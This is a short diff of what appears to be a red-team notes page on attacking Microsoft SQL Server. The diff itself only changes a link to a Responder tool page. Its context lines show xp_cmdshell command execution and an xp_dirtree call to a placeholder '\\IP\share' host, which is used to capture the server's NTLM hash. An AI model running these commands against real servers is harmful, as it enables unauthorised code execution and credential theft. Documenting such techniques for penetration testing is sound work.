@@ -127,7 +127,7 @@ xp_cmdshell 'whoami'
 
 Note that you can use `enable_xp_cmdshell` in `impacket-mssqlclient`.
 
-* We can steal hashes by setting up a [responder](/cybersecurity/red-team/_knowledge/topics/request_grabber.md#responder)
+* We can steal hashes by setting up a [responder](/cybersecurity/red-team/tools/utilities/networking/responder.md)
 
 ```sql!
 EXEC master..xp_dirtree '\\IP\share\'
